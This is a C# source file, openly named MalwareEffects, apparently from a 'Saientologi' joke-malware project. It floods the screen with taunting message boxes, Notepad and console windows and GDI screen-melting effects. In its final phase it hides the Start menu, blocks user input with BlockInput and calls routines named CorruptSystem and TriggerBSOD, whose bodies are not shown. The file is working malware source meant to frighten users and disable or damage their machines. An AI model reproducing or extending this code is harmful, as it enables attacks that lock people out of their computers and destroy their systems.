using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class MalwareEffects
{
    private const int WM_CLOSE = 0x0010;

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool SetWindowText(IntPtr hwnd, String lpString);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    [DllImport("User32.dll")]
    private static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam);

    [DllImport("user32.dll", EntryPoint = "FindWindowEx")]
    private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

    [DllImport("user32.dll")]
    private static extern bool BlockInput(bool fBlockIt);

    [DllImport("winmm.dll")]
    private static extern uint mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hWndCallback);

    private static ProtoRandom.ProtoRandom _random = new ProtoRandom.ProtoRandom(5);
    private static char[] _characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray();

    public static void StartMalware()
    {
        RunProgramLoadingEffects();
    }

    public static void RunProgramLoadingEffects()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        ShowDisappearingMessageBox("We are Saientologi. Are you ready to join us?", 2000, MessageBoxButtons.OK, MessageBoxIcon.Warning);
        ShowDisappearingMessageBox("We will introduce our religion to you. Stay ready.", 2000, MessageBoxButtons.OK, MessageBoxIcon.Information);
        ShowDisappearingMessageBox("Our god is Master Saientologi. We love it.", 1000, MessageBoxButtons.OK, MessageBoxIcon.Information);
        ShowSuperDisappearingMessageBox("Error fetching religion data due to inconsistency.", 2500, MessageBoxButtons.OK, MessageBoxIcon.Error);
        OpenNotepadAndWrite("Saientologi Loader is opening, please wait a while...", 10, 250, 10, 1500);
       
        RunMatrixEffect(5, false, 0, 3250, true, 1000);

        for (int i = 0; i < 5; i++)
        {
            RunMatrixEffect(3, false, 0, 100, false, 0);
        }

        RunMatrixEffect(6, true, 175, 3250, true, 1000);

        for (int i = 0; i < 5; i++)
        {
            RunMatrixEffect(3, false, 0, 100, false, 0);
        }

        RunMatrixEffect(7, true, 50, 3250, true, 1000);

        for (int i = 0; i < 5; i++)
        {
            RunMatrixEffect(3, false, 0, 100, false, 0);
        }

        RunMatrixEffect(8, true, 10, 3250, true, 1000);

        for (int i = 0; i < 5; i++)
        {
            RunMatrixEffect(3, false, 0, 100, false, 0);
        }

        DoInfinityWindow(200);

        for (int i = 0; i < 20; i++)
        {
            RunMatrixEffect(3, false, 0, 100, false, 0);
        }

        DoInfinityWindow(50);
        Application.Run(new SaientologiLoaderForm());
    }

    public static void PostJumpscareEffects()
    {
        DoInfinityWindow(50);

        for (int i = 0; i < 7; i++)
        {
            RunMatrixEffect(3, false, 0, 100, false, 0);
        }

        ShowDisappearingMessageBox("Don't worry, Master Saientologi will save us from hell.", 1350, MessageBoxButtons.OK, MessageBoxIcon.Information);
        ShowSuperDisappearingMessageBox("You will be not saved. Your PC will die soon. Master Saientologi is not from your side.", 2500, MessageBoxButtons.OK, MessageBoxIcon.Error);
        OpenNotepadAndWrite("Our god Master Saientologi will save us, I promise! And your PC will be saved.", 10, 250, 10, 1500);
        ShowSuperDisappearingMessageBox("You will be not saved. Your PC will die soon. Master Saientologi is not from your side.", 2500, MessageBoxButtons.OK, MessageBoxIcon.Error);

        DoInfinityWindow(50);

        for (int i = 0; i < 7; i++)
        {
            RunMatrixEffect(3, false, 0, 100, false, 0);
        }

        Thread.Sleep(1500);
        new ScaryForm().Show();
    }

    public static void PostScaryFormEffects()
    {
        DoInfinityWindow(50);

        for (int i = 0; i < 7; i++)
        {
            RunMatrixEffect(3, false, 0, 100, false, 0);
        }

        ShowSuperDisappearingMessageBox("You will be not saved. Your PC will die soon. Master Saientologi is not from your side.", 2500, MessageBoxButtons.OK, MessageBoxIcon.Error);
        OpenNotepadAndWrite("Your PC is going to be killed by Artemis, the king of the hell. Saientologi is a fake religion, they will not save you.", 10, 250, 10, 1500);
        Thread.Sleep(2000);
        new HellForm().Show();
    }

    public static void DoFinalPhase()
    {
        Utils.HideStartMenu();
        BlockInput(true);
        DoInfinityWindow(50);

        for (int i = 0; i < 20; i++)
        {
            RunMatrixEffect(3, false, 0, 100, false, 0);
        }

        DoColoredMeltingScreen();
        Utils.CorruptSystem();
        Utils.TriggerBSOD();
    }

    public static void DoColoredMeltingScreen()
    {
        int steps = 0;
        int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
        int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right,
            top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
        uint[] colors = new uint[] { 0xFF0000, 0xFF00BC, 0xFF700, 0x00FFEF };
        int coloredSteps = 15, windowSteps = 500, notepadSteps = 1000;

        while (steps <= 3250)
        {
            {
                IntPtr hdc = GDICore.GetDC(IntPtr.Zero);
                IntPtr mhdc = GDICore.CreateCompatibleDC(hdc);
                IntPtr hbit = GDICore.CreateCompatibleBitmap(hdc, x, y);
                IntPtr holdbit = GDICore.SelectObject(mhdc, hbit);
                byte[] bits = { 0xFF, 0xFF, 0xC3, 0xC3, 0xC3, 0xC3, 0xFF, 0xFF };
                IntPtr bitmap = GDICore.CreateBitmap(8, 8, 1, 1, IntPtr.Zero);
                IntPtr brush = GDICore.CreateSolidBrush(colors[1]);
                int rand = Utils.random.GetRandomInt32(0, y);
                GDICore.BitBlt(hdc, rand, Utils.random.GetRandomInt32(-4, 4), Utils.random.GetRandomInt32(0, 100), y, hdc, rand, 0, GDICore.TernaryRasterOperations.SRCCOPY);
                GDICore.DeleteDC(hdc);
            }

            {
                if (coloredSteps == 0)
                {
                    IntPtr hdc = GDICore.GetDC(IntPtr.Zero);
                    IntPtr brush = GDICore.CreateSolidBrush(colors[Utils.random.GetRandomInt32(0, colors.Length - 1)]);
                    GDICore.SelectObject(hdc, brush);
                    GDICore.PatBlt(hdc, 0, 0, x, y, GDICore.TernaryRasterOperations.PATINVERT);
                    GDICore.DeleteObject(brush);
                    GDICore.DeleteObject(hdc);
                    coloredSteps = 15;
                }
                else
                {
                    coloredSteps--;
                }
            }

            {
                if (windowSteps == 0)
                {
                    windowSteps = 500;
                    DoInfinityWindow(25);

                    for (int i = 0; i < 4; i++)
                    {
                        RunMatrixEffect(3, false, 0, 100, false, 0);
                    }
                }
                else
                {
                    windowSteps--;
                }
            }

            {
                if (notepadSteps == 0)
                {
                    notepadSteps = 1000;
                    OpenNotepadAndWrite("Your PC is going to be killed by Artemis, the king of the hell. Saientologi is a fake religion, they will not save you.", 10, 250, 10, 1500);
                }
                else
                {
                    notepadSteps--;
                }
            }

            Thread.Sleep(25);
            steps++;
        }
    }

    public static void DoInfinitySoundGDI()
    {
        mciSendString("stop scary_music", null, 0, IntPtr.Zero);
        mciSendString("close scary_music", null, 0, IntPtr.Zero);

        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        File.WriteAllBytes($"{rootDir}\\infinity_sound.mp3", Saientologi.Properties.Resources.infinity_sound);
        mciSendString($"open \"{rootDir}\\infinity_sound.mp3\" alias infinity_sound", null, 0, IntPtr.Zero);
        mciSendString("play infinity_sound", null, 0, IntPtr.Zero);

        int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
        int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right,
            top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
        GDICore.POINT[] thePoints = new GDICore.POINT[3];
        uint[] colors = new uint[] { 0xFF0000, 0xFF00BC, 0xFF700, 0x00FFEF };
        int steps = 0;

        while (steps <= 80)
        {
            IntPtr hdc = GDICore.GetDC(IntPtr.Zero);
            IntPtr mhdc = GDICore.CreateCompatibleDC(hdc);
            IntPtr hbit = GDICore.CreateCompatibleBitmap(hdc, x, y);
            IntPtr holdbit = GDICore.SelectObject(mhdc, hbit);
            thePoints[0].X = left + 50;
            thePoints[0].Y = top - 50;
            thePoints[1].X = right + 50;
            thePoints[1].Y = top + 50;
            thePoints[2].X = left - 50;
            thePoints[2].Y = bottom - 50;
            GDICore.PlgBlt(hdc, thePoints, hdc, left - 20, top - 20, (right - left) + 40, (bottom - top) + 40, IntPtr.Zero, 0, 0);
            GDICore.DeleteDC(hdc);

            hdc = GDICore.GetDC(IntPtr.Zero);
            IntPtr brush = GDICore.CreateSolidBrush(colors[Utils.random.GetRandomInt32(0, colors.Length - 1)]);
            GDICore.SelectObject(hdc, brush);
            GDICore.PatBlt(hdc, 0, 0, x, y, GDICore.TernaryRasterOperations.PATINVERT);
            GDICore.DeleteObject(brush);
            GDICore.DeleteObject(hdc);

            Thread.Sleep(230);
            steps++;
        }
    }

    public static void ShowDisappearingMessageBox(string message, int delay, MessageBoxButtons buttons, MessageBoxIcon icon)
    {
        new System.Threading.Timer(CloseMessageBox, null, delay, Timeout.Infinite);
        MessageBox.Show(message, "Saientologi", buttons, icon);
    }

    private static void CloseMessageBox(object state)
    {
        IntPtr hWnd = FindWindow(null, "Saientologi");

        if (hWnd != IntPtr.Zero)
        {
            SendMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
        }
    }

    private static void AlterMessageBoxTitle(object state)
    {
        string newWindowTitle = "Saientologi";
        int steps = 0;

        while (true)
        {
            steps++;

            if (steps == 150)
            {
                break;
            }

            Thread.Sleep(10);
            IntPtr hWnd = FindWindow(null, newWindowTitle);

            if (hWnd == IntPtr.Zero)
            {
                break;
            }

            newWindowTitle = _random.GetRandomString(_characters, 64);
            SetWindowText(hWnd, newWindowTitle);
        }

        IntPtr _hWnd = FindWindow(null, newWindowTitle);

        if (_hWnd != IntPtr.Zero)
        {
            SendMessage(_hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
        }
    }

    public static void ShowSuperDisappearingMessageBox(string message, int timeRemaining, MessageBoxButtons buttons, MessageBoxIcon icon)
    {
        new System.Threading.Timer(AlterMessageBoxTitle, null, 150, Timeout.Infinite);
        MessageBox.Show(message, "Saientologi", buttons, icon);
    }

    public static void OpenNotepadAndWrite(string str, int writeDelay, int delayAfterWindow, int quantity, int closeAfterDelay)
    {
        for (int i = 0; i < quantity; i++)
        {
            new Thread(() =>
            {
                try
                {
                    string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
                    ProcessStartInfo processInfo = new ProcessStartInfo("notepad.exe");
                    processInfo.CreateNoWindow = false;
                    processInfo.UseShellExecute = false;
                    processInfo.WindowStyle = ProcessWindowStyle.Maximized;
                    Process notepadProcess = Process.Start(processInfo);
                    IntPtr notepadTextBox = IntPtr.Zero;

                    while (notepadTextBox == IntPtr.Zero || notepadTextBox == new IntPtr(-1) || notepadProcess.MainWindowHandle == IntPtr.Zero || notepadProcess.MainWindowHandle == new IntPtr(-1))
                    {
                        notepadTextBox = FindWindowEx(notepadProcess.MainWindowHandle, IntPtr.Zero, "Edit", null);
                        Thread.Sleep(1);
                    }

                    MoveWindow(notepadProcess.MainWindowHandle, Utils.random.GetRandomInt32(0, 800), Utils.random.GetRandomInt32(0, 500), 970, 500, true);
                    Thread.Sleep(delayAfterWindow);
                    string completeText = "";

                    foreach (char c in str)
                    {
                        completeText += c;
                        SendMessage(notepadTextBox, 0x000C, 0, completeText);
                        SetWindowText(notepadProcess.MainWindowHandle, completeText);
                        Thread.Sleep(writeDelay);
                    }

                    Thread.Sleep(closeAfterDelay);
                    notepadProcess.Kill();
                }
                catch
                {

                }
            }).Start();
        }

        Thread.Sleep(closeAfterDelay + 1500);
    }

    public static void RunMatrixEffect(int matrixEffects, bool doContinuosMoving, int continuosMovingDelay, int terminationDelay, bool initialSleep, int initialSleepDelay)
    {
        try
        {
            string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";

            if (!File.Exists($"{rootDir}\\MatrixEffect.bat"))
            {
                File.WriteAllText($"{rootDir}\\MatrixEffect.bat", Saientologi.Properties.Resources.MatrixEffect);
            }

            List<Process> runProcesses = new List<Process>();
            
            if (initialSleep)
            {
                Thread.Sleep(initialSleepDelay);
            }

            for (int i = 0; i < matrixEffects; i++)
            {
                try
                {
                    ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c \"" + rootDir + "\\MatrixEffect.bat\"");
                    processInfo.CreateNoWindow = false;
                    processInfo.UseShellExecute = false;
                    Process process = Process.Start(processInfo);
                    runProcesses.Add(process);

                    while (process.MainWindowHandle.ToInt32() == 0)
                    {
                        Thread.Sleep(1);
                    }

                    MoveWindow(process.MainWindowHandle, Utils.random.GetRandomInt32(0, 800), Utils.random.GetRandomInt32(0, 500), 970, 500, true);
                }
                catch
                {

                }
            }

            if (doContinuosMoving)
            {
                foreach (Process process in runProcesses)
                {
                    new Thread(() =>
                    {
                        while (true)
                        {
                            Thread.Sleep(continuosMovingDelay);

                            try
                            {
                                Process.GetProcessById(process.Id);

                                if (process.MainWindowHandle.ToInt32() != 0)
                                {
                                    MoveWindow(process.MainWindowHandle, Utils.random.GetRandomInt32(0, 800), Utils.random.GetRandomInt32(0, 500), 970, 500, true);
                                }
                            }
                            catch
                            {
                                break;
                            }
                        }
                    }).Start();
                }
            }

            Thread.Sleep(terminationDelay);

            foreach (Process process in runProcesses)
            {
                try
                {
                    process.Kill();
                }
                catch
                {

                }
            }

            runProcesses.Clear();
        }
        catch
        {

        }
    }

    public static void DoInfinityWindow(int infinityWindowSteps)
    {
        try
        {
            string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";

            if (!File.Exists($"{rootDir}\\MatrixEffect.bat"))
            {
                File.WriteAllText($"{rootDir}\\MatrixEffect.bat", Saientologi.Properties.Resources.MatrixEffect);
            }

            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c \"" + rootDir + "\\MatrixEffect.bat\"");
            processInfo.CreateNoWindow = false;
            processInfo.UseShellExecute = false;
            Process process = Process.Start(processInfo);

            while (process.MainWindowHandle.ToInt32() == 0)
            {
                Thread.Sleep(1);
            }

            MoveWindow(process.MainWindowHandle, 0, 0, 970, 500, true);

            for (int i = 0; i < infinityWindowSteps; i++)
            {
                SetWindowText(process.MainWindowHandle, Utils.GenerateRandomConsoleTitle());
                Thread.Sleep(1);
            }

            process.Kill();
        }
        catch
        {

        }
    }
}